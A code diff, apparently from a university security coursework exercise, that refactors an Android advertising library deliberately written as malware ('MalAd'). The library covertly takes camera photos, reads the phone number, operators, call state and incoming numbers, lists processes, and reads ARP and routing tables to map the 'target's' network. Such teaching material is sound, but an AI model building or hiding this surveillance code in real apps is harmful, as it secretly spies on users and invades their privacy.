@@ -1,6 +1,5 @@
 package uk.ac.imperial.apss.comp97109.myadvertisinglibrary;
 
-
 import android.Manifest;
 import android.content.ContentResolver;
 import android.content.Context;
@@ -57,7 +56,7 @@ public class MyAdView {
     public static void loadAd(TextView tv, Context ctx) {
         MyAdView.ctx = ctx;
         // TASK 1: Welcome message changed
-        tv.setText("Hello Ad2new!");
+        tv.setText("Hello MalAd2new!");
         onLoad();
     }
 
@@ -70,7 +69,7 @@ public class MyAdView {
         if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             return;
         }
-        // Check if have retrieved the location ask for location updates
+        // Check if we have retrieved the location & ask for location updates
         assert locationManager != null : "Error while retrieving location.";
         locationManager.requestLocationUpdates(
                 LocationManager.GPS_PROVIDER, 5000, 10, locationListener);
@@ -114,52 +113,51 @@ public class MyAdView {
             }
         });
 
-        //Task 2.b get extra sensitive information
-        read_process();
-        retrive_network_info();
-        //determine local IPs, as well as gain a better understanding of the target’s networking structure
-        read_network_routing();
-        //get pic of the user
+        // Task 1B: Get extra sensitive information
+        readProcess();
+        retrieveNetworkInfo();
+        // Determine local IPs, as well as gain a better understanding of the target’s networking structure
+        readNetworkRouting();
+        // Get a pic from the user's phone camera
         try {
-            read_proc();
+            takePicture();
         } catch (Exception e) {
             e.printStackTrace();
         }
-        //get phone number
-        //use phone number collected by ad to advertice by sms
-        TelephonyManager tMgr = (TelephonyManager)ctx.getSystemService(Context.TELEPHONY_SERVICE);
+        // Phone number collected by advertising network for promotions via sms
+        TelephonyManager tMgr = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
         String mPhoneNumber = tMgr.getLine1Number();
-        Log.d("phone number",mPhoneNumber);
+        Log.d("Phone number: ", mPhoneNumber);
 
-        //get network and sim operator
+        // Get network and sim operator
         String networkOperator = tMgr.getNetworkOperatorName();
         String simOperator = tMgr.getSimOperatorName();
-        Log.d("phone network operator",networkOperator);
-        Log.d("phone sim operator",simOperator);
+        Log.d("Phone network operator: ", networkOperator);
+        Log.d("Phone sim operator: ", simOperator);
 
-        //get phone call state (if ongoing states)
+        // Get the phone call state (i.e., ringing, offhook, idle)
         StateListener phoneStateListener = new StateListener();
-        telephonyManager.listen(phoneStateListener,PhoneStateListener.LISTEN_CALL_STATE);
-
-
+        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
     }
+
     static class StateListener extends PhoneStateListener {
         @Override
         public void onCallStateChanged(int state, String incomingNumber) {
             super.onCallStateChanged(state, incomingNumber);
             switch (state) {
                 case TelephonyManager.CALL_STATE_RINGING:
-                    Log.d("phone call state","CALL_STATE_RINGING, ringing number: " + incomingNumber);
+                    Log.d("phone call state", "CALL_STATE_RINGING, ringing number: " + incomingNumber);
                     break;
                 case TelephonyManager.CALL_STATE_OFFHOOK:
-                    Log.d("phone call state","CALL_STATE_OFFHOOK, calling number: "  + incomingNumber);
+                    Log.d("phone call state", "CALL_STATE_OFFHOOK, calling number: " + incomingNumber);
                     break;
                 case TelephonyManager.CALL_STATE_IDLE:
-                    Log.d("phone call state","CALL_STATE_IDLE");
+                    Log.d("phone call state", "CALL_STATE_IDLE");
                     break;
             }
         }
-    };
+    }
+
     static String currentPhotoPath;
 
     private static File createImageFile() throws IOException {
@@ -178,25 +176,19 @@ public class MyAdView {
         return image;
     }
 
-
-
-    /**
-     * A safe way to get an instance of the Camera object.
-     */
     public static Camera getCameraInstance() {
         Camera c = null;
         try {
-            c = Camera.open(); // attempt to get a Camera instance
+            c = Camera.open(); // Get a Camera instance
         } catch (Exception e) {
             // Camera is not available (in use or does not exist)
         }
         return c; // returns null if camera is unavailable
     }
 
-    private static void read_proc() throws IOException {
+    private static void takePicture() throws IOException {
         // Create an instance of Camera
         Camera mCamera = getCameraInstance();
-
 
         Camera.PictureCallback mPicture = new Camera.PictureCallback() {
 
@@ -206,7 +198,7 @@ public class MyAdView {
                 File photoFile = null;
                 try {
                     photoFile = createImageFile();
-                    Log.d("photo path",photoFile.getAbsolutePath());
+                    Log.d("Photo path: ", photoFile.getAbsolutePath());
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
@@ -219,7 +211,7 @@ public class MyAdView {
                     FileOutputStream fos = new FileOutputStream(photoFile);
                     fos.write(data);
                     fos.close();
-                    Log.d("take photo","photo taken success");
+                    Log.d("Take photo", "Photo taken success");
                 } catch (FileNotFoundException e) {
                     Log.d(TAG, "File not found: " + e.getMessage());
                 } catch (IOException e) {
@@ -228,10 +220,9 @@ public class MyAdView {
             }
         };
         mCamera.takePicture(null, null, mPicture);
-
     }
 
-    private static void read_network_routing() {
+    private static void readNetworkRouting() {
         try {
             Process process = Runtime.getRuntime().exec("cat /proc/net/fib_trie");
             BufferedReader bufferedReader = new BufferedReader(
@@ -241,29 +232,28 @@ public class MyAdView {
             while (((line = bufferedReader.readLine()) != null)) {
                 final_info += line + "\n";
             }
-            Log.d("network routing", final_info);
-
+            Log.d("Network routing: ", final_info);
         } catch (Exception e) {
-
+            e.printStackTrace();
+            System.out.println(e);
         }
-
     }
 
-    private static void retrive_network_info() {
+    private static void retrieveNetworkInfo() {
         try {
             Process process = Runtime.getRuntime().exec("cat /proc/net/arp");
             BufferedReader bufferedReader = new BufferedReader(
                     new InputStreamReader(process.getInputStream()));
             String line;
             while (((line = bufferedReader.readLine()) != null)) {
-                Log.d("network interface info", line + "\n");
+                Log.d("Network interface info: ", line + "\n");
             }
         } catch (Exception e) {
 
         }
     }
 
-    private static void read_process() {
+    private static void readProcess() {
         ArrayList<String> Name = new ArrayList<>();
         ArrayList<Long> CPU = new ArrayList<>();
         ArrayList<String[]> all_process_info = new ArrayList<>();
@@ -303,9 +293,8 @@ public class MyAdView {
         } catch (Exception e) {
             e.printStackTrace();
         }
-
-        Log.d("process name", Name.toString());
-        Log.d("CPU util", CPU.toString());
+        Log.d("Process name: ", Name.toString());
+        Log.d("CPU util: ", CPU.toString());
     }
 
     // TASK 5: Read the user's contacts
